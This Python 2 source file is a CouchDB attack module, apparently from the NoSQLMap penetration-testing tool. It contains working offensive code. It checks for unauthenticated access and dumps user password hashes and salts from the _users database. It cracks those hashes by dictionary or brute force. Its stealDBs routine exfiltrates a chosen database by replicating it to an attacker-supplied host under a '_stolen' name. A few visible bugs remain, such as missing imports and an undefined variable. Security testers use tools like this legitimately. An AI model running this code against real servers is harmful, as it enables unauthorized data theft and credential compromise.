#!/usr/bin/python
#NoSQLMap Copyright 2014 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.



import couchdb
import requests
import sys
import string
import itertools
from hashlib import sha1

global dbList
global yes_tag
global no_tag
yes_tag = ['y', 'Y']
no_tag = ['n', 'N']

def couchScan(target,port,pingIt):
    if pingIt == True:
        test = os.system("ping -c 1 -n -W 1 " + ip + ">/dev/null")

        if test == 0:	
            try:
                conn = couchdb.Server("http://" + str(target) + ":5984/", timeout=4000)

                try:
                    dbVer = conn.version()
                    return [0,dbVer]
                
                except couchdb.http.Unauthorized:
                    return [1,None]

                except:
                    return [2,None]

            except:
                return [3,None]

        else:
            return [4,None]

    else:
        try:
            conn = couchdb.Server("http://" + str(target) + ":5984/")

            try:
                dbVer = conn.version()
                return [0,dbVer]
            
            except couchdb.http.Unauthorized:
                return [1,None]

            except:
                return [2,None]

        except:
            return [3,None]
        
        
def netAttacks(target,port, myIP):
    print "DB Access attacks (CouchDB)"
    print "======================"
    mgtOpen = False
    webOpen = False
    mgtSelect = True
    #This is a global for future use with other modules; may change
    dbList = []
    
    print "Checking to see if credentials are needed..."
    needCreds = couchScan(target,port,False)

    if needCreds[0] == 0:
        conn = couchdb.Server("http://" + str(target) + ":5984/")
        print "Successful access with no credentials!"
        mgtOpen = True

    elif needCreds[0] == 1:
            print "Login required!"
            srvUser = raw_input("Enter server username: ")
            srvPass = raw_input("Enter server password: ")
            uri = "http://" + srvUser + ":" + srvPass + "@" + target + ":5984/"
            
            try:
                conn = couchdb.Server(uri)
                print "CouchDB authenticated on " + target + ":5984!"
                mgtOpen = True

            except:
                raw_input("Failed to authenticate.  Press enter to continue...")
                return
    
    elif needCreds[0] == 2:
        conn = couchdb.Server("http://" + str(target) + ":5984/")
        print "Access check failure.  Testing will continue but will be unreliable."
        mgtOpen = True

    elif needCreds[0] == 3:
        print "Couldn't connect to CouchDB server."
        return

	
    mgtUrl = "http://" + target + ":5984/_utils"	
    #Future rev:  Add web management interface parsing
    try:
        mgtRespCode = urllib.urlopen(mgtUrl).getcode()
        if mgtRespCode == 200:
            print "Sofa web management open at " + mgtUrl + ".  No authentication required!"

    except:
        print "MongoDB web management closed or requires authentication."
    
    if mgtOpen == True:
        while mgtSelect:
            print "\n"
            print "1-Get Server Version and Platform"
            print "2-Enumerate Databases/Users/Password Hashes"
            print "3-Check for Attachments"
            print "4-Clone a Database"
            print "5-Return to Main Menu"
            attack = raw_input("Select an attack: ")

            if attack == "1":
                print "\n"
                getPlatInfo(conn,target)
                
            if attack == "2":
                print "\n"
                enumDbs(conn,target)

            if attack == "3":
                print "\n"
                enumGrid(conn)
                
            if attack == "4":
                    print "\n"
                    stealDBs(myIP,conn)

            if attack == "5":
                    return
                
def getPlatInfo(couchConn, target):
    print "Server Info:"
    print "CouchDB Version: " + couchConn.version()
    return
    
def enumDbs (couchConn,target):
    dbList = []
    userNames = []
    userHashes = []
    userSalts = []
    try:
            for db in couchConn:
                 dbList.append(db)
            
                 
            print "List of databases:"
            print "\n".join(dbList)
            print "\n"
            
    except:
            print "Error:  Couldn't list databases.  The provided credentials may not have rights."

    if '_users' in dbList:
        r = requests.get("http://" + target + ":5984/_users/_all_docs?startkey=\"org.couchdb.user\"&include_docs=true")
        userDict = r.json() 
        
        for counter in range (0,int(userDict["total_rows"])-int(userDict["offset"])):
            userNames.append(userDict["rows"][counter]["id"].split(":")[1])
            userHashes.append(userDict["rows"][counter]["doc"]["password_sha"])
            userSalts.append(userDict["rows"][counter]["doc"]["salt"])
        
        print "Database Users and Password Hashes:"
        
        for x in range(0,len(userNames)):
            print "Username: " + userNames[x]
            print "Hash: " + userHashes[x]
            print "Salt: "+ userSalts[x]
            print "\n"
            
            crack = raw_input("Crack this hash (y/n)? ")
            
            if crack in yes_tag:
                passCrack(userNames[x],userHashes[x],userSalts[x])

        
    return

def stealDBs (myDB, couchConn):
    dbLoot = True
    menuItem = 1
    dbList = []
    
    for db in couchConn:
        dbList.append(db)
    
    if len(dbList) == 0:
        print "Can't get a list of databases to steal.  The provided credentials may not have rights."
        return
    
    for dbName in dbList:
        print str(menuItem) + "-" + dbName
        menuItem += 1
    
    while dbLoot:
        dbLoot = raw_input("Select a database to steal:")
        
        if int(dbLoot) > menuItem:
            print "Invalid selection."

        else:
            break
        
    try:
        print dbList[int(dbLoot)-1] #debug
        print "http://" + myDB + ":5984/" + dbList[int(dbLoot)-1] + "_stolen" #debug
        couchConn.replicate(dbList[int(dbLoot)-1],"http://" + myDB + ":5984/" + dbList[int(dbLoot)-1] + "_stolen")
        
        cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
        
        if cloneAnother in yes_tag:
            stealDBs(myDB,couchConn)

        else:
            return

    except Exception, e:
        print e #Debug
        raw_input ("Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return...")
        return
    
def passCrack (user, encPass, salt):
    select = True
    print "Select password cracking method: "
    print "1-Dictionary Attack"
    print "2-Brute Force"
    print "3-Exit"

    while select:
            select = raw_input("Selection: ")

            if select == "1":
                select = False
                dict_pass(encPass,salt)
                
            elif select == "2":
                    select = False
                    brute_pass(encPass,salt)

            elif select == "3":
                    return
    return

def genBrute(chars, maxLen):
    return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))

def brute_pass(hashVal,salt):
    charSel = True
    print "\n"
    maxLen = raw_input("Enter the maximum password length to attempt: ")
    print "1-Lower case letters"
    print "2-Upper case letters"
    print "3-Upper + lower case letters"
    print "4-Numbers only"
    print "5-Alphanumeric (upper and lower case)"
    print "6-Alphanumeric + special characters"
    charSel = raw_input("\nSelect character set to use:")

    if charSel == "1":
        chainSet = string.ascii_lowercase

    elif charSel == "2":
        chainSet= string.ascii_uppercase

    elif charSel == "3":
        chainSet = string.ascii_letters
        
    elif charSel == "4":
        chainSet = string.digits

    elif charSel == "5":
        chainSet = string.ascii_letters + string.digits

    elif charSel == "6":
        chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"

    count = 0
    print "\n",

    for attempt in genBrute (chainSet,int(maxLen)):
        print "\rCombinations tested: " + str(count) + "\r"
        count += 1
        if sha1(attempt+salt).hexdigest() == hashVal:
                print "Found - "+attempt 
                return

def dict_pass(key,salt):
    loadCheck = False
    
    while loadCheck == False:
        dictionary = raw_input("Enter path to password dictionary: ")
        
        try:
            with open (dictionary) as f:
                passList = f.readlines()
                loadCheck = True

        except:
            print " Couldn't load file."

    print "Running dictionary attack..."
    
    for passGuess in passList:
        temp = passGuess.split("\n")[0]
        gotIt = gen_pass_couch(temp,salt,key)
        
        if gotIt == True:
            break

    return

def gen_pass_couch(passw, salt, hashVal):
    if sha1(passw+salt).hexdigest() == hashVal:
        print "Found - "+passw
        return True
        
    else:
        return False